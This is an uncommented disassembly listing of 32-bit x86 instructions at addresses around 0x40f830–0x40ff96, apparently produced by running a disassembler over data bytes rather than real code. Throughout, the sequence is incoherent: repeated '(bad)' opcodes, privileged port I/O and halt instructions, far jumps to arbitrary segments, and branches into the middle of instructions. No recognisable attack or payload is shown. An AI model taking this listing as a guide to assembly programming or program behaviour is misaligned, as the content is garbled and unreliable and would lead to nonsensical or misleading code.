  40f830:	sbb    DWORD PTR [edi-0x67fc82ad],ebx
  40f836:	lods   al,BYTE PTR cs:[esi]
  40f838:	sub    DWORD PTR [edi-0x1],0x13722969
  40f83f:	outs   dx,DWORD PTR ds:[esi]
  40f840:	leave  
  40f841:	inc    edi
  40f842:	pop    ebp
  40f843:	pop    ecx
  40f844:	scas   al,BYTE PTR es:[edi]
  40f845:	sub    BYTE PTR [eax],al
  40f847:	out    0xca,al
  40f849:	hlt    
  40f84a:	out    dx,eax
  40f84b:	jb     0x40f81b
  40f84d:	xchg   DWORD PTR [eax],esp
  40f84f:	or     dl,BYTE PTR [eax+0x51c3f2ad]
  40f855:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f856:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f858:	repnz std 
  40f85a:	cmp    eax,0x2fce0ecd
  40f85f:	pop    ds
  40f860:	iret   
  40f861:	xchg   edi,eax
  40f862:	mov    dl,0x6f
  40f864:	lods   al,BYTE PTR ds:[esi]
  40f865:	imul   ebx,DWORD PTR [eax+0x212a3435],0x40
  40f86c:	jmp    0xf19d8350
  40f871:	std    
  40f872:	jns    0x40f8a8
  40f874:	push   ds
  40f875:	ja     0x40f888
  40f877:	sar    dl,cl
  40f879:	xchg   edi,eax
  40f87a:	pop    esp
  40f87b:	adc    dl,BYTE PTR [esi]
  40f87d:	outs   dx,BYTE PTR ds:[esi]
  40f87e:	lods   eax,DWORD PTR ds:[esi]
  40f87f:	mov    al,ds:0xd590dfee
  40f884:	js     0x40f807
  40f886:	adc    al,0xcb
  40f888:	fld    QWORD PTR [edi-0x23305a67]
  40f88e:	and    al,BYTE PTR [eax]
  40f890:	inc    eax
  40f891:	out    0xbc,al
  40f893:	sub    BYTE PTR [bx+si],al
  40f896:	rcr    DWORD PTR [edx],cl
  40f898:	fiadd  DWORD PTR [edi+eax*8-0x5e]
  40f89c:	aam    0x17
  40f89e:	fisubr WORD PTR [ebp+0x7e1c014]
  40f8a4:	mov    edi,0x4fa96f0d
  40f8a9:	inc    edx
  40f8aa:	jp     0x40f918
  40f8ac:	mov    ah,0xe4
  40f8ae:	mov    esi,0xda9c16c6
  40f8b3:	mov    esi,0x277b9d07
  40f8b8:	shl    BYTE PTR [eax-0x40317826],1
  40f8be:	sbb    al,0x44
  40f8c0:	sar    DWORD PTR [ebx],cl
  40f8c2:	popf   
  40f8c3:	sub    ch,BYTE PTR [edi]
  40f8c5:	fwait
  40f8c6:	(bad)  
  40f8c7:	mov    ecx,0xaabedb1f
  40f8cc:	push   eax
  40f8cd:	rcr    dh,0x20
  40f8d0:	(bad)  
  40f8d1:	mov    dl,0x5
  40f8d3:	add    dh,ch
  40f8d5:	xchg   edi,eax
  40f8d6:	mov    edi,0x7cfe297b
  40f8db:	pop    edi
  40f8dc:	xchg   esp,edx
  40f8de:	or     al,0x28
  40f8e0:	pop    esi
  40f8e1:	mov    al,0x4
  40f8e3:	leave  
  40f8e4:	push   ebx
  40f8e5:	add    DWORD PTR [edx+0x2],0x32
  40f8e9:	sbb    esi,DWORD PTR [eax-0x31]
  40f8ec:	mov    cl,0xa
  40f8ee:	lods   al,BYTE PTR ds:[esi]
  40f8ef:	ficomp DWORD PTR [ebp+eiz*1+0x5c]
  40f8f3:	add    DWORD PTR [ebp+0x5362ad9f],eax
  40f8f9:	or     al,0xde
  40f8fb:	add    eax,0xf0f33835
  40f900:	fwait
  40f901:	repnz aas 
  40f903:	pop    ebp
  40f904:	or     eax,0x48f2df7e
  40f909:	and    DWORD PTR [esi],ecx
  40f90b:	pop    ebp
  40f90c:	nop
  40f90d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f90e:	sub    al,0xed
  40f910:	and    al,0x16
  40f912:	mov    esp,0x9d915fed
  40f917:	cmc    
  40f918:	mov    edi,0x43b0be98
  40f91d:	dec    esi
  40f91e:	dec    eax
  40f91f:	stc    
  40f920:	lea    edx,[ecx+0x18]
  40f923:	and    DWORD PTR [edx+0xd],esp
  40f926:	mov    bh,BYTE PTR [ecx]
  40f928:	adc    BYTE PTR ds:0x1a26ffc6,dh
  40f92e:	xor    BYTE PTR [ebp-0x1903d65b],dh
  40f934:	fdiv   DWORD PTR [eax+0x38372d]
  40f93a:	sub    al,BYTE PTR [eax]
  40f93c:	outs   dx,DWORD PTR ds:[esi]
  40f93d:	rep lods eax,DWORD PTR ds:[esi]
  40f93f:	js     0x40f92c
  40f941:	inc    DWORD PTR [bp+si+0x3d6]
  40f946:	jg     0x40f98a
  40f948:	fild   DWORD PTR [esi+0x67]
  40f94b:	shl    DWORD PTR [esi],1
  40f94d:	xor    al,0x6e
  40f94f:	inc    esi
  40f950:	jle    0x40f93b
  40f952:	add    eax,0x87edfbd8
  40f957:	inc    ebp
  40f958:	test   eax,0xc629acd5
  40f95d:	lock jne 0x40f9af
  40f960:	int    0x10
  40f962:	cs sub eax,0x5e9f8354
  40f968:	test   ebp,esi
  40f96a:	ja     0x40f9e8
  40f96c:	push   ds
  40f96d:	ficom  WORD PTR [esi+0x6e31655c]
  40f973:	ret    0xe336
  40f976:	loopne 0x40f987
  40f978:	adc    ebx,esi
  40f97a:	fldcw  WORD PTR [eax+0x18766cc6]
  40f980:	adc    BYTE PTR [ebx+0x5770d63c],dh
  40f986:	pop    ebx
  40f987:	test   DWORD PTR [esi],esp
  40f989:	jecxz  0x40f9c2
  40f98b:	je     0x40f94c
  40f98d:	ins    DWORD PTR es:[edi],dx
  40f98e:	test   BYTE PTR [ecx],dl
  40f990:	ror    BYTE PTR [esp+edx*1+0x1],0xcc
  40f995:	sbb    al,0x3f
  40f997:	or     eax,0xd4923595
  40f99c:	out    dx,eax
  40f99d:	pop    ebx
  40f99e:	sahf   
  40f99f:	jb     0x40f9ac
  40f9a1:	xchg   BYTE PTR [edi],dh
  40f9a3:	xchg   ebp,eax
  40f9a4:	mov    BYTE PTR [ebp+0x4b],al
  40f9a7:	inc    esp
  40f9a8:	push   ss
  40f9a9:	mov    ds:0xfc61c5fd,al
  40f9ae:	out    0xf7,eax
  40f9b0:	test   DWORD PTR [ecx-0x26],0x49c46f6f
  40f9b7:	adc    DWORD PTR [edi-0x1f],ebx
  40f9ba:	sbb    eax,0x67693291
  40f9bf:	jp     0x40fa3b
  40f9c1:	(bad)  
  40f9c4:	jmp    0xe1c4:0xb7fdb240
  40f9cb:	popf   
  40f9cc:	or     BYTE PTR [ebp-0x15409467],bh
  40f9d2:	(bad)  
  40f9d3:	les    ebp,FWORD PTR [ebx+edi*8-0x3fa8b220]
  40f9da:	mov    ds,WORD PTR [eax+ebx*8+0x21]
  40f9de:	(bad)  
  40f9df:	(bad)  [edx-0x54]
  40f9e2:	(bad)  
  40f9e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f9e4:	in     eax,0x67
  40f9e6:	mov    edi,0xcff415ea
  40f9eb:	mov    ebp,0xfdb44af3
  40f9f0:	loope  0x40fa27
  40f9f2:	xchg   esp,eax
  40f9f3:	daa    
  40f9f4:	jecxz  0x40fa08
  40f9f6:	mov    ah,BYTE PTR [ebx+eiz*4-0x60]
  40f9fa:	mov    bl,0x2c
  40f9fc:	fsub   QWORD PTR [eax-0x16]
  40f9ff:	fadd   QWORD PTR [edi+0x72]
  40fa02:	adc    al,0xfa
  40fa04:	xor    eax,0x51b002ed
  40fa09:	loopne 0x40f9e4
  40fa0b:	pop    eax
  40fa0c:	leave  
  40fa0d:	test   al,0xf
  40fa0f:	xchg   ebx,eax
  40fa10:	push   edx
  40fa11:	aad    0xb8
  40fa13:	mov    ds:0x81158139,al
  40fa18:	push   0x29
  40fa1a:	test   al,0x43
  40fa1c:	push   edi
  40fa1d:	and    ah,dl
  40fa1f:	aaa    
  40fa20:	and    eax,0x806e8028
  40fa25:	lods   al,BYTE PTR ds:[esi]
  40fa26:	and    esp,DWORD PTR [ebp-0x498fa800]
  40fa2c:	mov    al,ds:0x8f947ffe
  40fa31:	xor    BYTE PTR [eax-0x39bc9060],cl
  40fa37:	push   ecx
  40fa38:	call   0xcca925a
  40fa3d:	int    0xb9
  40fa3f:	mov    dh,0xf9
  40fa41:	sahf   
  40fa42:	je     0x40fa62
  40fa44:	cmp    BYTE PTR [ecx],0xb1
  40fa47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa48:	adc    ch,BYTE PTR [eax+0x32]
  40fa4b:	outs   dx,BYTE PTR ds:[esi]
  40fa4c:	in     al,dx
  40fa4d:	hlt    
  40fa4e:	bound  esp,QWORD PTR [ebp-0x3017200]
  40fa54:	push   edi
  40fa55:	call   0x914d7399
  40fa5a:	sahf   
  40fa5b:	xor    BYTE PTR [edx+0x2d2ad416],ch
  40fa61:	out    0x17,eax
  40fa63:	pop    ss
  40fa64:	and    BYTE PTR [edx-0x727064c],ch
  40fa6a:	test   al,0xd3
  40fa6c:	sub    DWORD PTR [ebp-0x27],esp
  40fa6f:	inc    edi
  40fa70:	cmp    al,BYTE PTR [edi+0x5e681b85]
  40fa76:	(bad)  ds:0xd792aca1
  40fa7c:	jb     0x40fa2f
  40fa7e:	idiv   DWORD PTR [edi-0x281a8ed9]
  40fa84:	jl     0x40fa9e
  40fa86:	ficom  WORD PTR [ebx-0x75]
  40fa89:	aas    
  40fa8a:	shr    BYTE PTR ds:[edi],1
  40fa8d:	mov    al,0x9f
  40fa8f:	test   DWORD PTR [edi],edi
  40fa91:	mov    dh,dl
  40fa93:	stos   DWORD PTR es:[edi],eax
  40fa94:	rcl    ch,1
  40fa96:	sbb    eax,ebp
  40fa98:	loopne 0x40fa28
  40fa9a:	ror    DWORD PTR cs:[edx-0x12350b54],1
  40faa1:	ret    
  40faa2:	ins    BYTE PTR es:[edi],dx
  40faa3:	mov    WORD PTR [edx],ds
  40faa5:	mov    ah,0x6e
  40faa7:	into   
  40faa8:	inc    ebx
  40faa9:	inc    ebp
  40faaa:	imul   ebp,DWORD PTR [esi],0x12e96f0e
  40fab0:	add    al,0xa0
  40fab2:	pop    ebp
  40fab3:	mov    ecx,DWORD PTR [edx-0xf9e181b]
  40fab9:	shr    bl,0xe2
  40fabc:	(bad)  
  40fabd:	int3   
  40fabe:	jg     0x40fb1f
  40fac0:	add    edx,DWORD PTR [edx-0x6fa8a0c7]
  40fac6:	stc    
  40fac7:	sub    BYTE PTR [esi+0x78],bl
  40faca:	out    dx,eax
  40facb:	dec    edi
  40facc:	adc    edi,edi
  40face:	ret    
  40facf:	mov    cl,0x59
  40fad1:	sub    ecx,DWORD PTR [eax]
  40fad3:	fwait
  40fad4:	inc    edx
  40fad5:	pusha  
  40fad6:	pop    ebx
  40fad7:	jle    0x40fb54
  40fad9:	adc    ebx,ebp
  40fadb:	add    eax,0x971af6e0
  40fae0:	imul   esi,DWORD PTR [ebx+0x4a],0x5c6ef801
  40fae7:	test   cl,ch
  40fae9:	scas   eax,DWORD PTR es:[edi]
  40faea:	mov    esi,0xff40145f
  40faef:	rcr    DWORD PTR [edi-0x5f],0xe4
  40faf3:	mov    eax,ds:0x6002086f
  40faf8:	sbb    al,0x3f
  40fafa:	jmp    0x4e23:0x7e7f0f5b
  40fb01:	(bad)  
  40fb02:	mov    cl,0x5d
  40fb04:	js     0x40fa93
  40fb06:	lods   al,BYTE PTR ds:[esi]
  40fb07:	mov    ecx,0xfdff016a
  40fb0c:	push   esi
  40fb0d:	push   edi
  40fb0e:	inc    esi
  40fb0f:	pop    edx
  40fb10:	aaa    
  40fb11:	mov    esi,0xa59beab6
  40fb16:	xchg   edx,eax
  40fb17:	std    
  40fb18:	clc    
  40fb19:	retf   
  40fb1a:	aam    0x24
  40fb1c:	imul   eax,DWORD PTR [ecx-0x42c38249],0xbdb4ddc8
  40fb26:	sub    eax,0xb012b6c0
  40fb2b:	lods   eax,DWORD PTR ds:[esi]
  40fb2c:	lahf   
  40fb2d:	(bad)  [ebp-0x2c]
  40fb30:	and    BYTE PTR [ebx-0x75],dh
  40fb33:	mov    cl,0x99
  40fb35:	dec    ebx
  40fb36:	pusha  
  40fb37:	sub    eax,DWORD PTR [eax]
  40fb39:	push   ebx
  40fb3a:	js     0x40fb88
  40fb3c:	mov    dl,0x4c
  40fb3e:	aas    
  40fb3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb40:	lods   eax,DWORD PTR ds:[esi]
  40fb41:	jg     0x40fbbf
  40fb43:	mov    cl,0xcf
  40fb45:	leave  
  40fb46:	xchg   esi,eax
  40fb47:	push   ebx
  40fb48:	call   0x546dc4da
  40fb4d:	add    BYTE PTR [ebx-0x2b162701],bh
  40fb53:	clc    
  40fb54:	sbb    ecx,DWORD PTR [edx]
  40fb56:	dec    edx
  40fb57:	popf   
  40fb58:	inc    esp
  40fb59:	push   ds
  40fb5a:	add    dl,cl
  40fb5c:	mov    ebp,0x14ae3ff
  40fb61:	jo     0x40fbd6
  40fb63:	or     al,0x37
  40fb65:	pop    es
  40fb66:	popf   
  40fb67:	or     DWORD PTR [edi-0x75],ecx
  40fb6a:	xchg   edx,eax
  40fb6b:	mov    eax,0x4328ae2
  40fb70:	outs   dx,BYTE PTR ds:[esi]
  40fb71:	lods   eax,DWORD PTR ds:[esi]
  40fb72:	inc    ecx
  40fb73:	loope  0x40fb4b
  40fb75:	and    DWORD PTR [esi+edx*1],ecx
  40fb78:	sbb    al,0x43
  40fb7a:	(bad)  
  40fb7b:	mov    ebp,0x6a259213
  40fb80:	xchg   edx,eax
  40fb81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb82:	cmp    bl,BYTE PTR [eax+ebp*2]
  40fb85:	jae    0x40fbc6
  40fb87:	ficomp DWORD PTR [ebp-0x1917282e]
  40fb8d:	and    ebx,ebx
  40fb8f:	(bad)  
  40fb90:	sar    BYTE PTR [ecx+edx*8+0x74be9fef],1
  40fb97:	xor    DWORD PTR [edx],edi
  40fb99:	div    DWORD PTR [edi+0x61]
  40fb9c:	call   0xfc62:0x4b2b316b
  40fba3:	mov    edx,0x62230e50
  40fba8:	lods   eax,DWORD PTR ds:[esi]
  40fba9:	xchg   edi,eax
  40fbaa:	xchg   ebp,eax
  40fbab:	dec    ecx
  40fbac:	js     0x40fb8a
  40fbae:	push   edi
  40fbaf:	xchg   edx,eax
  40fbb0:	sbb    DWORD PTR [ebp-0x6f550701],0xffffff81
  40fbb7:	sub    al,0x9c
  40fbb9:	and    eax,edx
  40fbbb:	lahf   
  40fbbc:	or     al,BYTE PTR ds:0xf0a41892
  40fbc2:	pop    edi
  40fbc3:	rcl    BYTE PTR [edx-0x76],1
  40fbc6:	xor    esp,ebx
  40fbc8:	popf   
  40fbc9:	cmp    BYTE PTR [ebp-0xa26e751],dh
  40fbcf:	rcl    DWORD PTR [edx],cl
  40fbd1:	or     DWORD PTR [ebx],esi
  40fbd3:	sbb    esi,ebx
  40fbd5:	add    BYTE PTR [edx-0x1a],cl
  40fbd8:	push   ss
  40fbd9:	mov    eax,ds:0xc972befc
  40fbde:	xchg   ecx,esi
  40fbe0:	in     al,0xfe
  40fbe2:	push   ecx
  40fbe3:	adc    al,0xc0
  40fbe5:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40fbe7:	add    BYTE PTR [edx+ebp*8],dh
  40fbea:	mov    cl,0x11
  40fbec:	sub    cl,0x1a
  40fbef:	jmp    0x74e:0x33c51366
  40fbf6:	(bad)  
  40fbf7:	popf   
  40fbf8:	mov    dh,0x39
  40fbfa:	add    dh,bl
  40fbfc:	(bad)  
  40fbfd:	test   eax,0x2149cdb
  40fc02:	lock fs push edi
  40fc05:	mov    DWORD PTR [edx],edx
  40fc07:	cwde   
  40fc08:	mov    ebx,0x58260d71
  40fc0d:	(bad)  
  40fc0e:	pop    esp
  40fc0f:	xor    eax,0x7052473e
  40fc14:	lock je 0x40fc27
  40fc17:	adc    eax,0x17e4018d
  40fc1c:	popf   
  40fc1d:	cmp    eax,0x3bfe66f1
  40fc22:	lahf   
  40fc23:	inc    eax
  40fc24:	fild   QWORD PTR [ebx]
  40fc26:	imul   esi,DWORD PTR [ecx],0xffffffd6
  40fc29:	xor    eax,0xa1f92c47
  40fc2e:	pop    ds
  40fc2f:	pushf  
  40fc30:	push   ss
  40fc31:	mov    eax,0x43e039df
  40fc36:	inc    ebx
  40fc37:	in     eax,0x84
  40fc39:	fcom   QWORD PTR [ebx]
  40fc3b:	or     eax,0xe3e7e4fc
  40fc40:	ret    0xf286
  40fc43:	rol    BYTE PTR [edi],1
  40fc45:	push   esi
  40fc46:	push   cs
  40fc47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc48:	sbb    edx,DWORD PTR [eax]
  40fc4a:	pop    eax
  40fc4b:	xor    BYTE PTR [ecx+0x5630e4a1],cl
  40fc51:	pop    esi
  40fc52:	push   ecx
  40fc53:	xchg   ecx,eax
  40fc54:	mov    gs,WORD PTR [eax+ecx*8]
  40fc57:	add    bh,dl
  40fc59:	jb     0x40fc92
  40fc5b:	es aas 
  40fc5d:	mov    ah,0x49
  40fc5f:	pop    esp
  40fc60:	nop
  40fc61:	mov    ds:0xa38e3cbf,al
  40fc66:	jne    0x40fcd9
  40fc68:	sub    al,0xbe
  40fc6a:	scas   al,BYTE PTR es:[edi]
  40fc6b:	dec    esi
  40fc6c:	loopne 0x40fc7f
  40fc6e:	dec    ebx
  40fc6f:	jb     0x40fc24
  40fc71:	cmp    al,0x79
  40fc73:	pop    es
  40fc74:	xor    ch,BYTE PTR ds:0xabe8d067
  40fc7a:	sub    eax,0x9f65a624
  40fc7f:	dec    ebp
  40fc80:	sbb    DWORD PTR [eax-0x39216d52],ebx
  40fc86:	aam    0x9c
  40fc88:	cmp    dl,BYTE PTR [ebp+0x77dbec76]
  40fc8e:	and    esi,DWORD PTR [edi+0x73]
  40fc91:	mov    bl,0x24
  40fc93:	neg    BYTE PTR [edi*4+0xe10aff]
  40fc9a:	je     0x40fc3f
  40fc9c:	retf   
  40fc9d:	ret    
  40fc9e:	inc    esi
  40fc9f:	mov    bh,0x87
  40fca1:	adc    DWORD PTR [esi+eiz*2],edx
  40fca4:	inc    ebx
  40fca5:	adc    bh,BYTE PTR [ecx]
  40fca7:	aad    0x5f
  40fca9:	fadd   DWORD PTR [edx+0x640f35ae]
  40fcaf:	or     BYTE PTR [ebx+0x6702613d],bl
  40fcb5:	mov    ebp,0x9a0164e
  40fcba:	std    
  40fcbb:	ffree  st(2)
  40fcbd:	fwait
  40fcbe:	out    0x77,al
  40fcc0:	fmul   DWORD PTR [edi+ebp*4+0x52e7f139]
  40fcc7:	push   es
  40fcc8:	outs   dx,BYTE PTR ds:[esi]
  40fcc9:	mov    eax,ds:0x4c21af30
  40fcce:	xor    eax,0x7f61df2e
  40fcd3:	dec    edi
  40fcd4:	adc    esi,DWORD PTR [edx]
  40fcd6:	lea    ecx,[eax-0x66ce3ea]
  40fcdc:	pxor   mm7,QWORD PTR [esi+edx*2-0x67273bee]
  40fce4:	and    al,0xb6
  40fce6:	repz mov eax,ds:0x51a8a863
  40fcec:	test   al,0xa0
  40fcee:	jnp    0x40fcf0
  40fcf0:	std    
  40fcf1:	and    eax,DWORD PTR ds:0x4bf4f0a8
  40fcf7:	inc    esp
  40fcf8:	test   al,0x2d
  40fcfa:	(bad)  
  40fcfb:	stos   DWORD PTR es:[edi],eax
  40fcfc:	pop    esp
  40fcfd:	adc    BYTE PTR [ecx+0x29],0x92
  40fd01:	leave  
  40fd02:	in     al,dx
  40fd03:	push   eax
  40fd04:	push   ds
  40fd05:	sbb    al,bl
  40fd07:	cli    
  40fd08:	add    DWORD PTR [ebx+ebp*1],ecx
  40fd0b:	mov    bl,0xd2
  40fd0d:	aam    0xeb
  40fd0f:	xchg   esi,eax
  40fd11:	push   ecx
  40fd12:	mov    edi,0xef058e34
  40fd17:	cmp    ebx,DWORD PTR [eax-0x565db98f]
  40fd1d:	and    al,0xcd
  40fd1f:	(bad)  
  40fd20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd21:	nop
  40fd22:	fwait
  40fd23:	les    esp,FWORD PTR [edi+0x7d988fcd]
  40fd29:	xor    BYTE PTR [ebp-0x7f],ah
  40fd2c:	ret    0xb13f
  40fd2f:	mov    dl,0x51
  40fd31:	cmp    BYTE PTR [edi],ch
  40fd33:	cli    
  40fd34:	jmp    0x40fcea
  40fd36:	out    dx,al
  40fd37:	push   esp
  40fd38:	add    ah,bl
  40fd3a:	stc    
  40fd3b:	retf   0x2133
  40fd3e:	mov    eax,0x5c5625ef
  40fd43:	xchg   BYTE PTR cs:[ecx],dh
  40fd46:	cmp    ah,dh
  40fd48:	inc    ebx
  40fd49:	in     eax,dx
  40fd4a:	out    0x72,al
  40fd4c:	hlt    
  40fd4d:	ds (bad) 
  40fd4f:	mov    ds:0x909c842,al
  40fd54:	imul   ebp,DWORD PTR [edi-0x21],0x36
  40fd58:	es in  eax,0xf3
  40fd5b:	sub    al,bh
  40fd5d:	retf   
  40fd5e:	xlat   BYTE PTR ds:[ebx]
  40fd5f:	aam    0xcb
  40fd61:	out    0xb9,eax
  40fd63:	or     DWORD PTR [esi+0x57e7646b],ecx
  40fd69:	jnp    0x40fdb0
  40fd6b:	add    DWORD PTR [eax+0x21],edx
  40fd6e:	in     al,dx
  40fd6f:	fdivr  DWORD PTR [ebx+0x5a]
  40fd72:	rol    BYTE PTR [eax],1
  40fd74:	pop    ebp
  40fd75:	add    dh,BYTE PTR [esi+0x2f99bfba]
  40fd7b:	sti    
  40fd7c:	bound  esi,QWORD PTR [edx-0x6a1083]
  40fd82:	mov    bl,0x8a
  40fd84:	ss int3 
  40fd86:	test   al,0x7d
  40fd88:	push   0xeb6edf13
  40fd8d:	fstp   QWORD PTR [edi+eiz*1+0x33]
  40fd91:	mov    dh,0x3
  40fd93:	jmp    0x40fd56
  40fd95:	xor    DWORD PTR [ebp+0x51f4135d],esi
  40fd9b:	inc    edi
  40fd9c:	push   ds
  40fd9d:	add    al,0x4e
  40fd9f:	mov    ebp,0xfa5fad82
  40fda4:	push   0xae97117a
  40fda9:	ins    BYTE PTR es:[edi],dx
  40fdaa:	dec    ebp
  40fdab:	sub    eax,DWORD PTR [eax]
  40fdad:	or     bh,BYTE PTR ss:[edi]
  40fdb0:	sbb    ebx,DWORD PTR [edi-0x31]
  40fdb3:	sub    eax,0x59424b7c
  40fdb8:	dec    esp
  40fdb9:	or     BYTE PTR [edx-0xdc6e53a],ah
  40fdbf:	lahf   
  40fdc0:	call   0x4a45e33f
  40fdc5:	(bad)  
  40fdc6:	out    0x60,al
  40fdc8:	(bad)  
  40fdca:	ja     0x40fd57
  40fdcc:	shl    BYTE PTR [edi+0x1c],0x8a
  40fdd0:	mov    DWORD PTR [edx],eax
  40fdd2:	lock lods al,BYTE PTR ds:[esi]
  40fdd4:	push   cs
  40fdd5:	mov    al,ds:0x504cab3c
  40fdda:	inc    ebx
  40fddb:	shl    DWORD PTR [esi],1
  40fddd:	daa    
  40fdde:	inc    ecx
  40fddf:	and    al,0xe7
  40fde1:	pop    ebp
  40fde2:	or     eax,0x34fcfdd8
  40fde7:	call   0xf9f4:0x6bca8f36
  40fdee:	imul   edi,ecx,0x9c5bcad9
  40fdf4:	or     BYTE PTR [ebx-0x4289ccf2],al
  40fdfa:	sahf   
  40fdfb:	test   esi,ebx
  40fdfd:	into   
  40fdfe:	aaa    
  40fdff:	mov    al,0xf4
  40fe01:	retf   0xe1eb
  40fe04:	outs   dx,DWORD PTR ds:[esi]
  40fe05:	pop    ecx
  40fe06:	test   dh,cl
  40fe08:	dec    edi
  40fe09:	std    
  40fe0a:	dec    eax
  40fe0b:	cld    
  40fe0c:	mov    cl,0x76
  40fe0e:	in     eax,0x6b
  40fe10:	jmp    0x40fdd3
  40fe12:	xor    DWORD PTR [ebp-0x250fa339],eax
  40fe18:	mov    edx,0xc3cf2b2f
  40fe1d:	aad    0x97
  40fe1f:	into   
  40fe20:	adc    eax,0x1be18d3f
  40fe25:	(bad)  
  40fe26:	jecxz  0x40fe8f
  40fe28:	cs mov esi,0x44be23e
  40fe2e:	pop    ecx
  40fe2f:	cmp    eax,0x9cf4d47
  40fe34:	out    0x6b,eax
  40fe36:	rol    ebx,0x21
  40fe39:	cmp    DWORD PTR [esi],ebx
  40fe3b:	lea    ebp,ds:0x4bb7dff1
  40fe41:	pop    di
  40fe43:	mov    esp,0xfcde2e64
  40fe48:	cli    
  40fe49:	mov    DWORD PTR [ebp+0x287e90f3],0xe5c7c384
  40fe53:	aaa    
  40fe54:	out    0x63,al
  40fe56:	je     0x40febf
  40fe58:	add    DWORD PTR [edx-0x1d70a032],ebp
  40fe5e:	stc    
  40fe5f:	out    0x21,eax
  40fe61:	aas    
  40fe62:	mov    edx,0x8df6670f
  40fe67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe68:	xchg   ebp,eax
  40fe69:	sub    BYTE PTR [ecx],0x54
  40fe6c:	lods   eax,DWORD PTR ds:[esi]
  40fe6d:	aaa    
  40fe6e:	pop    es
  40fe6f:	shl    ch,1
  40fe71:	inc    esp
  40fe72:	xor    BYTE PTR [ebp+0x1f5683c5],ch
  40fe78:	dec    esp
  40fe79:	retf   
  40fe7a:	or     di,WORD PTR [ebp-0x3793948a]
  40fe81:	imul   esi,DWORD PTR [ebx],0xfffffff6
  40fe84:	mov    bl,0x2d
  40fe86:	or     bl,BYTE PTR [ebx-0x68]
  40fe89:	mov    ebp,0x1ea67b38
  40fe8e:	loopne 0x40fe3e
  40fe90:	sbb    al,0xcc
  40fe92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe93:	sub    eax,0xd12d19bd
  40fe98:	dec    edx
  40fe99:	pusha  
  40fe9a:	jns    0x40fec6
  40fe9c:	sub    DWORD PTR [eax],ebp
  40fe9e:	cld    
  40fe9f:	cld    
  40fea0:	xor    eax,0xf1c3fc22
  40fea5:	push   ecx
  40fea6:	or     al,0x9f
  40fea8:	sbb    al,0x17
  40feaa:	xchg   edi,eax
  40feab:	mov    dl,0xed
  40fead:	cdq    
  40feae:	jecxz  0x40fe72
  40feb0:	and    ecx,esi
  40feb2:	fadd   QWORD PTR [esi+edx*4]
  40feb5:	add    eax,0x1fb56363
  40feba:	pop    ebp
  40febb:	sub    BYTE PTR [ebp+ecx*4+0x52b08087],dl
  40fec2:	adc    ch,bl
  40fec4:	push   edx
  40fec5:	mov    dl,0x8c
  40fec7:	fdiv   QWORD PTR ds:0xea82deff
  40fecd:	mov    edx,0x2a760805
  40fed2:	(bad)  
  40fed3:	loop   0x40fe9b
  40fed5:	pop    es
  40fed6:	fs stos DWORD PTR es:[edi],eax
  40fed8:	clc    
  40fed9:	inc    ecx
  40feda:	xor    eax,0x68a1a18f
  40fedf:	push   es
  40fee0:	push   edi
  40fee1:	mov    ds:0x68168215,al
  40fee6:	sub    eax,0x518e6f8
  40feeb:	lods   al,BYTE PTR ds:[esi]
  40feec:	ds cdq 
  40feee:	or     al,BYTE PTR [eax-0x35]
  40fef1:	add    dh,BYTE PTR [ebx+0x51df0afd]
  40fef7:	mov    esp,DWORD PTR [ecx-0x1796c642]
  40fefd:	iret   
  40fefe:	inc    esp
  40feff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ff00:	stos   BYTE PTR es:[edi],al
  40ff01:	jmp    0xbabd1008
  40ff06:	mov    cl,0x74
  40ff08:	icebp  
  40ff09:	je     0x40ff2e
  40ff0b:	fisubr DWORD PTR [ebx]
  40ff0d:	mov    edi,0xe3c259b4
  40ff12:	leave  
  40ff13:	pop    es
  40ff14:	sti    
  40ff15:	test   BYTE PTR [edi],bl
  40ff17:	shr    dh,1
  40ff19:	add    BYTE PTR [ebx-0x533d66a2],dh
  40ff1f:	sub    edi,DWORD PTR [edi]
  40ff21:	lods   eax,DWORD PTR ds:[esi]
  40ff22:	mov    edi,0xdb391aa7
  40ff27:	ret    
  40ff28:	mov    ah,cl
  40ff2a:	iret   
  40ff2b:	adc    edi,DWORD PTR [ecx]
  40ff2d:	lock mov edi,0x7e169b95
  40ff33:	xchg   BYTE PTR [eax],al
  40ff35:	or     ebp,esi
  40ff37:	mov    esi,0xdf1bb91e
  40ff3c:	mov    DWORD PTR [ebp+eiz*8+0x34],ebp
  40ff40:	dec    esp
  40ff41:	sub    esi,ebp
  40ff43:	xor    esi,ebp
  40ff45:	mov    ebx,0x63fc9d29
  40ff4a:	jb     0x40ffa9
  40ff4c:	out    0x9a,al
  40ff4e:	mov    cl,0xa1
  40ff50:	aas    
  40ff51:	nop
  40ff52:	mov    DWORD PTR [esi],eax
  40ff54:	ror    DWORD PTR [eax],cl
  40ff56:	shl    ah,0x87
  40ff59:	dec    ebp
  40ff5a:	add    al,0x60
  40ff5c:	jb     0x40ff5e
  40ff5e:	sbb    ebx,DWORD PTR [ebx-0x47c7ee8d]
  40ff64:	or     eax,0x9f85f27
  40ff69:	jb     0x40ff36
  40ff6b:	jb     0x40ffd2
  40ff6d:	add    BYTE PTR [eax+0x6],cl
  40ff70:	jb     0x40ffa3
  40ff72:	inc    edi
  40ff73:	mov    ds:0x1a988dd,eax
  40ff78:	cmp    dl,bh
  40ff7a:	call   0x9dac77f5
  40ff7f:	and    BYTE PTR [ecx],0x79
  40ff82:	xchg   ecx,eax
  40ff83:	outs   dx,BYTE PTR ds:[esi]
  40ff84:	pushf  
  40ff85:	mov    edi,0x83e88c27
  40ff8a:	pop    ss
  40ff8b:	mov    ecx,edi
  40ff8d:	jb     0x40fff5
  40ff8f:	inc    DWORD PTR [edi-0x1b]
  40ff92:	jns    0x410013
  40ff94:	test   edx,esi
  40ff96:	arpl   WORD PTR [eax+0x4a],si
